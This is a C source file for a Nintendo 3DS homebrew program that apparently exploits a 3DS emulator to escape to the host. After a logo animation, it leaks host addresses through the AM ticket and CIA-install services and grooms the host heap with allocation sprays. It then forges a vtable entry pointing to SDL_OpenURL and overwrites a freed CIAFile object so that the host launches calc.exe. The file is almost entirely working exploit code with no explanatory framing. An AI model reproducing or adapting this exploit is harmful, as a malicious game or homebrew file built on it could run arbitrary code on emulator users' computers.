#include <3ds.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "v12_logo.h"

#define CTRL_VT_RVA 0x1670628ULL
#define FILE_DEAD_VT_RVA 0x1674a58ULL
#define SDL_OPEN_URL_RVA 0x0c4b7c0ULL
#define ARG_GADGET_RVA 0x037f3f3ULL
#define FALSE_RVA 0x0116f60ULL
#define FILE_LEAK_SIZE 0xf0
#define FILE_BACKEND_OFFSET 0xe8
#define VECTOR_FIRST_SIZE 0x2071
#define COMMAND_OFFSET 0x100
/*
 * Occupy stale host allocations in the CIAFile/vector size class. Cancelling
 * the sole active CIA then creates the only reusable large hole.
 */
#define VECTOR_SPRAY_COUNT 60

#define FILE_GROOM_PRIMES 32
#define LEAK_ATTEMPTS 128
#define TARGET_SPRAY_ATTEMPTS 512
#define TARGET_READS_PER_CYCLE 4
#define TARGET_SPRAY_MAX 128



static void rect(u8 *fb, int x, int y, int w, int h, u32 color) {
    for (int px = x; px < x + w; px++)
        for (int py = y; py < y + h; py++) {
            u8 *p = fb + (px * 240 + 239 - py) * 3;
            p[0] = color;
            p[1] = color >> 8;
            p[2] = color >> 16;
        }
}
static void star(u8 *fb, int x, int y, int r) {
    rect(fb, x - r, y, r * 2 + 1, 1, 0xd5a63a);
    rect(fb, x, y - r, 1, r * 2 + 1, 0xd5a63a);
}


static void frame(unsigned tick) {
    u16 width, height;
    u8 *fb = gfxGetFramebuffer(GFX_TOP, GFX_LEFT, &width, &height);
    rect(fb, 0, 0, 400, 240, 0xf6f4f0);
    rect(fb, 14, 14, 372, 2, 0x292526);
    rect(fb, 14, 224, 372, 2, 0x292526);

    unsigned rows = tick * 2;
    if (rows > LOGO_HEIGHT) rows = LOGO_HEIGHT;
    for (unsigned i = 0; i < LOGO_RUN_COUNT; i++) {
        const LogoRun *run = &kLogoRuns[i];
        if (run->y >= rows) continue;
        rect(fb, 21 + run->x1, 35 + run->y, run->x2 - run->x1, 1, 0xd8cba8);
        rect(fb, 20 + run->x1, 34 + run->y, run->x2 - run->x1, 1, 0x292526);
    }

    int beam = 20 + (tick * 5 % LOGO_WIDTH);
    rect(fb, beam, 28, 1, 165, 0xd5a63a);
    star(fb, 32, 29, 2 + (tick / 8 % 5));
    star(fb, 368, 198, 2 + ((tick + 19) / 8 % 5));

    rect(fb, 20, 210, 360, 4, 0xd8d3ca);
    unsigned progress = tick < 120 ? tick * 3 : 360;
    rect(fb, 20, 210, progress, 4, 0xd5a63a);
    gfxFlushBuffers();
    gfxSwapBuffersGpu();
    aptMainLoop();
    gspWaitForVBlank();
}

static void intro(void) {
    for (unsigned tick = 0; tick < 360; tick++) frame(tick);
}

static u64 load64(const void *p) {
    u64 v;
    memcpy(&v, p, sizeof(v));
    return v;
}

static void store64(void *p, u64 v) {
    memcpy(p, &v, sizeof(v));
}

static int plausible(u64 p) {
    return p > 0x100000000ULL && p < 0x0000800000000000ULL && !(p & 7);
}

static int read_leak(Handle h, void *out, u32 size) {
    u32 n = 0;
    memset(out, 0, size);
    return R_SUCCEEDED(FSFILE_Read(h, &n, 0, out, size)) && n == size;
}

static int parse_cia_leak(const u8 *out, u64 expected, u64 *image, u64 *object) {
    u64 control_vtable = load64(out);
    u64 dead_vtable = load64(out + 0x10);
    *object = load64(out + FILE_BACKEND_OFFSET);
    *image = control_vtable - CTRL_VT_RVA;
    if ((*image & 0xffff) && plausible(dead_vtable))
        *image = dead_vtable - FILE_DEAD_VT_RVA;
    if (expected) {
        if (control_vtable != expected + CTRL_VT_RVA &&
            dead_vtable != expected + FILE_DEAD_VT_RVA)
            return 0;
        *image = expected;
    }
    return plausible(*object) && !(*image & 0xffff);
}

static int cycle_cia_leak(Handle leak, u64 forbidden, u64 *base, u64 *backend,
                          Result *result) {
    u8 out[FILE_LEAK_SIZE];
    u64 expected = *base;

    for (u32 attempt = 0; attempt < LEAK_ATTEMPTS; attempt++) {
        Handle cia = 0;
        u64 image, object;
        if (R_FAILED(*result = AM_StartTempCiaInstall(&cia)) ||
            R_FAILED(*result = AM_CancelCIAInstall(cia)) ||
            !read_leak(leak, out, sizeof(out)))
            return 0;
        if (!parse_cia_leak(out, expected, &image, &object))
            continue;
        if (object == forbidden)
            continue;
        *base = image;
        *backend = object;
        return 1;
    }
    return 0;
}
static int collect_cia_candidates(Handle leak, u64 base, u64 *backends,
                                  u32 *count, Result *result) {
    u8 out[FILE_LEAK_SIZE];

    *count = 0;
    for (u32 attempt = 0; attempt < TARGET_SPRAY_ATTEMPTS; attempt++) {
        Handle cia = 0;
        if (R_FAILED(*result = AM_StartTempCiaInstall(&cia)) ||
            R_FAILED(*result = AM_CancelCIAInstall(cia)))
            return 0;

        for (u32 read = 0; read < TARGET_READS_PER_CYCLE; read++) {
            u64 image, object;
            if (!read_leak(leak, out, sizeof(out)))
                return 0;
            if (!parse_cia_leak(out, base, &image, &object))
                continue;

            u32 i;
            for (i = 0; i < *count && backends[i] != object; i++) {}
            if (i == *count && *count < TARGET_SPRAY_MAX)
                backends[(*count)++] = object;
        }
    }
    return *count != 0;
}


static int write_ticket(Handle h, const void *payload) {
    u32 n = 0;
    u8 one = 0;
    return R_SUCCEEDED(FSFILE_Write(h, &n, 0, payload, VECTOR_FIRST_SIZE, 0)) &&
           n == VECTOR_FIRST_SIZE &&
           R_SUCCEEDED(FSFILE_Write(h, &n, VECTOR_FIRST_SIZE, &one, 1, 0)) && n == 1;
}


static void hold(void) {
    while (aptMainLoop()) {
        hidScanInput();
        if (hidKeysDown() & KEY_START) break;
        gspWaitForVBlank();
    }
}

int main(void) {
    static u8 payload[VECTOR_FIRST_SIZE];
    Handle vector_spray[VECTOR_SPRAY_COUNT] = {0};
    Handle leak = 0, source = 0, target = 0;
    u64 target_backends[TARGET_SPRAY_MAX];
    u64 base = 0, donor = 0, target_backend = 0, vector = 0, offset = 0;
    u32 target_count = 0, n = 0;
    u8 prime[FILE_LEAK_SIZE];
    int error = 0;
    Result result = 0;
    FILE *debug;

    gfxInitDefault();
    intro();
    error = 1;
    if (R_FAILED(result = amInit()) ||
        R_FAILED(result = AMNET_InstallTicketBegin(&leak)))
        goto fail;

    error = 2;
    for (u32 i = 0; i < FILE_GROOM_PRIMES; i++) {
        if (!read_leak(leak, prime, sizeof(prime))) goto fail;
    }

    /*
     * Each two-write ticket leaves its final vector in the same host size
     * class as CIAFile. Retaining these vectors removes old reusable holes.
     */
    memset(payload, 0, sizeof(payload));
    error = 3;
    for (u32 i = 0; i < VECTOR_SPRAY_COUNT; i++) {
        if (R_FAILED(result = AMNET_InstallTicketBegin(&vector_spray[i])) ||
            !write_ticket(vector_spray[i], payload))
            goto fail;
    }

    /*
     * Cycle one CIAFile-sized allocation until its wrapper disclosure is
     * recovered, then immediately replace that hot hole with the source vector.
     */
    error = 4;
    if (!cycle_cia_leak(leak, 0, &base, &donor, &result))
        goto fail;

    memset(payload, 0, sizeof(payload));
    store64(payload + 0x08, base + SDL_OPEN_URL_RVA);
    store64(payload + 0x20, base + ARG_GADGET_RVA);
    store64(payload + 0x38, base + FALSE_RVA);
    memcpy(payload + COMMAND_OFFSET, "C:\\Windows\\System32\\calc.exe", 29);
    if (R_FAILED(result = AMNET_InstallTicketBegin(&source)) ||
        !write_ticket(source, payload))
        goto fail;
    vector = (donor + 0x27) & ~0x1fULL;

    /*
     * Sample the allocator's complete CIA slot rotation. The next live target
     * must reuse one of these recently freed addresses.
     */
    error = 7;
    if (!collect_cia_candidates(leak, base, target_backends, &target_count, &result))
        goto fail;
    error = 8;
    if (R_FAILED(result = AM_StartTempCiaInstall(&target)))
        goto fail;

    error = 9;
    for (u32 i = 0; i < target_count; i++) {
        target_backend = target_backends[i];
        offset = target_backend - vector;
        if (R_FAILED(result =
                FSFILE_Write(source, &n, offset, &vector, sizeof(vector), 0)) ||
            n != sizeof(vector))
            goto fail;
    }
    error = 10;
    if (R_FAILED(result = FSFILE_SetSize(target, vector + COMMAND_OFFSET)))
        goto fail;

    hold();
    gfxExit();
    return 0;

fail:
    debug = fopen("sdmc:/azahar-error.txt", "w");
    if (debug) {
        fprintf(debug,
                "error=%d result=%08lx n=%lu base=%llx donor=%llx vector=%llx "
                "target=%llx offset=%llx handles=%lx,%lx,%lx\n",
                error, (unsigned long)result, (unsigned long)n,
                (unsigned long long)base, (unsigned long long)donor,
                (unsigned long long)vector, (unsigned long long)target_backend,
                (unsigned long long)offset, (unsigned long)leak,
                (unsigned long)source, (unsigned long)target);
        fclose(debug);
    }
    hold();
    gfxExit();
    return 1;
}
